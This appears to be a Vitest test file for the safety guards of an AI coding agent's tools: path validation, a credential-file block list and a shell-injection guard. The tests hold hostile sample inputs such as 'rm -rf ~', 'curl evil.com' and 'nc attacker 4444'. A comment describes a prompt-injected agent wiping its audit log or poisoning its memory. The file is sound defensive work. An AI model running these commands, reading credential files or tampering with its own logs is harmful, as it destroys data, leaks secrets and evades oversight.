import { describe, it, expect } from 'vitest';

// Test validateFilePath logic directly (mirrors tools.ts implementation)
function validateFilePath(filePath: string): string | null {
  if (!filePath || filePath.trim().length === 0) return 'Error: file path is empty.';
  if (/[`\x00-\x1f]/.test(filePath)) return `Error: invalid characters in file path: ${filePath.slice(0, 80)}`;
  if (filePath.length > 80) return `Error: file path too long (${filePath.length} chars): ${filePath.slice(0, 80)}...`;
  const segments = filePath.split(/[\\/]/);
  for (const seg of segments) {
    if (seg.length > 60) return `Error: path segment too long: ${seg.slice(0, 60)}...`;
  }
  if (filePath.includes('..')) return `Error: path traversal ("..") is not allowed: ${filePath}`;
  if (filePath.startsWith('/') || /^[A-Z]:\\/.test(filePath)) return 'Error: absolute paths are not allowed.';
  return null;
}

// Test isSensitiveFile logic
const SENSITIVE_PATTERNS = [
  /^\.env($|\.)/i,
  /\.pem$/i,
  /\.key$/i,
  /\.p12$/i,
  /\.pfx$/i,
  /^id_rsa/i,
  /^id_ed25519/i,
  /credentials\.json$/i,
  /secrets?\.(json|ya?ml|toml)$/i,
  /\.secret$/i,
  /token\.json$/i,
  /service.account\.json$/i,
];

function isSensitiveFile(filePath: string): boolean {
  const basename = filePath.split(/[\\/]/).pop() || '';
  return SENSITIVE_PATTERNS.some((p) => p.test(basename));
}

// Test isProtectedWritePath logic (mirrors tools.ts implementation)
const PROTECTED_WRITE_PREFIXES = ['.sidecar/logs/', '.sidecar/memory/', '.sidecar/sessions/', '.sidecar/cache/'];

function isProtectedWritePath(filePath: string): string | null {
  const normalized = filePath.replace(/\\/g, '/');
  if (normalized === '.sidecar/settings.json') {
    return `Refusing to write SideCar's own settings file (${filePath})`;
  }
  for (const prefix of PROTECTED_WRITE_PREFIXES) {
    if (normalized.startsWith(prefix) || normalized.startsWith('./' + prefix)) {
      return `Refusing to write under ${prefix}`;
    }
  }
  return null;
}

describe('validateFilePath', () => {
  it('accepts valid relative paths', () => {
    expect(validateFilePath('src/index.ts')).toBeNull();
    expect(validateFilePath('README.md')).toBeNull();
    expect(validateFilePath('deeply/nested/dir/file.js')).toBeNull();
  });

  it('rejects empty paths', () => {
    expect(validateFilePath('')).toContain('empty');
    expect(validateFilePath('   ')).toContain('empty');
  });

  it('rejects path traversal', () => {
    expect(validateFilePath('../etc/passwd')).toContain('traversal');
    expect(validateFilePath('../../.ssh/id_rsa')).toContain('traversal');
    expect(validateFilePath('src/../../../secret')).toContain('traversal');
  });

  it('rejects absolute paths', () => {
    expect(validateFilePath('/etc/passwd')).toContain('absolute');
    expect(validateFilePath('/home/user/.ssh/id_rsa')).toContain('absolute');
  });

  it('rejects paths with control characters', () => {
    expect(validateFilePath('file\x00name.ts')).toContain('invalid characters');
    expect(validateFilePath('file`name.ts')).toContain('invalid characters');
  });

  it('rejects excessively long paths', () => {
    const longPath = 'a'.repeat(81);
    expect(validateFilePath(longPath)).toContain('too long');
  });

  it('rejects long path segments', () => {
    const longSegment = 'a'.repeat(61);
    expect(validateFilePath(`src/${longSegment}/file.ts`)).toContain('segment too long');
  });
});

describe('isSensitiveFile', () => {
  it('blocks env files', () => {
    expect(isSensitiveFile('.env')).toBe(true);
    expect(isSensitiveFile('.env.local')).toBe(true);
    expect(isSensitiveFile('.env.production')).toBe(true);
  });

  it('blocks crypto files', () => {
    expect(isSensitiveFile('private.key')).toBe(true);
    expect(isSensitiveFile('cert.pem')).toBe(true);
    expect(isSensitiveFile('keystore.p12')).toBe(true);
    expect(isSensitiveFile('cert.pfx')).toBe(true);
  });

  it('blocks SSH keys', () => {
    expect(isSensitiveFile('id_rsa')).toBe(true);
    expect(isSensitiveFile('id_ed25519')).toBe(true);
  });

  it('blocks credential files', () => {
    expect(isSensitiveFile('credentials.json')).toBe(true);
    expect(isSensitiveFile('secrets.json')).toBe(true);
    expect(isSensitiveFile('secrets.yaml')).toBe(true);
    expect(isSensitiveFile('token.json')).toBe(true);
  });

  it('allows normal files', () => {
    expect(isSensitiveFile('index.ts')).toBe(false);
    expect(isSensitiveFile('package.json')).toBe(false);
    expect(isSensitiveFile('utils/helpers.py')).toBe(false);
  });

  it('checks basename not full path', () => {
    expect(isSensitiveFile('config/.env')).toBe(true);
    expect(isSensitiveFile('deeply/nested/.env.local')).toBe(true);
  });
});

describe('isProtectedWritePath', () => {
  // Regression: a prompt-injected agent used to be able to clear
  // .sidecar/logs/audit.jsonl (repudiation) or poison
  // .sidecar/memory/agent-memories.json (persistence across sessions).
  // SENSITIVE_PATTERNS only looked at basenames so these slipped through.
  it('blocks writes under .sidecar/logs (repudiation)', () => {
    expect(isProtectedWritePath('.sidecar/logs/audit.jsonl')).not.toBeNull();
    expect(isProtectedWritePath('.sidecar/logs/nested/file.log')).not.toBeNull();
  });
  it('blocks writes under .sidecar/memory (poisoning)', () => {
    expect(isProtectedWritePath('.sidecar/memory/agent-memories.json')).not.toBeNull();
  });
  it('blocks writes under .sidecar/sessions and .sidecar/cache', () => {
    expect(isProtectedWritePath('.sidecar/sessions/last.json')).not.toBeNull();
    expect(isProtectedWritePath('.sidecar/cache/embeddings.bin')).not.toBeNull();
  });
  it('blocks writes to .sidecar/settings.json specifically', () => {
    expect(isProtectedWritePath('.sidecar/settings.json')).not.toBeNull();
  });
  it('allows writes to human-editable .sidecar working areas', () => {
    expect(isProtectedWritePath('.sidecar/SIDECAR.md')).toBeNull();
    expect(isProtectedWritePath('.sidecar/plans/my-plan.md')).toBeNull();
    expect(isProtectedWritePath('.sidecar/specs/my-spec.md')).toBeNull();
    expect(isProtectedWritePath('.sidecar/scratchpad/notes.md')).toBeNull();
  });
  it('allows normal workspace writes', () => {
    expect(isProtectedWritePath('src/foo.ts')).toBeNull();
    expect(isProtectedWritePath('README.md')).toBeNull();
  });
  it('handles Windows-style separators', () => {
    expect(isProtectedWritePath('.sidecar\\logs\\audit.jsonl')).not.toBeNull();
  });
  it('handles ./-prefixed paths', () => {
    expect(isProtectedWritePath('./.sidecar/logs/audit.jsonl')).not.toBeNull();
  });
});

// ---------------------------------------------------------------------------
// Shell quoting for run_tests `file` parameter
// ---------------------------------------------------------------------------
// Mirrors the implementation in tools.ts; tested here to lock in the
// regression from the cycle-2 audit where `run_tests` interpolated a
// model-supplied `file` string straight into a shell command.

function shellQuote(value: string): string {
  return `'${value.replace(/'/g, "'\\''")}'`;
}

function hasShellMetachar(value: string): boolean {
  return /[\n\r;&|`$<>()!*?[\]{}"'\\]/.test(value);
}

describe('shellQuote', () => {
  it('wraps simple values in single quotes', () => {
    expect(shellQuote('foo.test.ts')).toBe("'foo.test.ts'");
  });
  it('escapes embedded single quotes so the quoting stays balanced', () => {
    expect(shellQuote("foo's test.ts")).toBe("'foo'\\''s test.ts'");
  });
  it('safely handles spaces inside the path', () => {
    expect(shellQuote('some file.ts')).toBe("'some file.ts'");
  });
});

describe('hasShellMetachar (run_tests injection guard)', () => {
  it('accepts plain relative paths', () => {
    expect(hasShellMetachar('src/foo.test.ts')).toBe(false);
    expect(hasShellMetachar('tests/unit/module.spec.ts')).toBe(false);
    expect(hasShellMetachar('a-b_c.test.js')).toBe(false);
  });
  it('rejects command-chaining metacharacters', () => {
    expect(hasShellMetachar('foo.test.ts; rm -rf ~')).toBe(true);
    expect(hasShellMetachar('foo.test.ts && curl evil.com')).toBe(true);
    expect(hasShellMetachar('foo.test.ts | nc attacker 4444')).toBe(true);
  });
  it('rejects substitution metacharacters', () => {
    expect(hasShellMetachar('foo$(whoami).ts')).toBe(true);
    expect(hasShellMetachar('foo`id`.ts')).toBe(true);
  });
  it('rejects redirection metacharacters', () => {
    expect(hasShellMetachar('foo > /tmp/pwn')).toBe(true);
    expect(hasShellMetachar('foo < /etc/passwd')).toBe(true);
  });
  it('rejects glob / quote / escape metacharacters', () => {
    expect(hasShellMetachar('*.ts')).toBe(true);
    expect(hasShellMetachar('foo?.ts')).toBe(true);
    expect(hasShellMetachar("foo's")).toBe(true);
    expect(hasShellMetachar('foo"bar')).toBe(true);
    expect(hasShellMetachar('foo\\bar')).toBe(true);
  });
  it('rejects newline-based injection', () => {
    expect(hasShellMetachar('foo\nrm -rf ~')).toBe(true);
  });
});
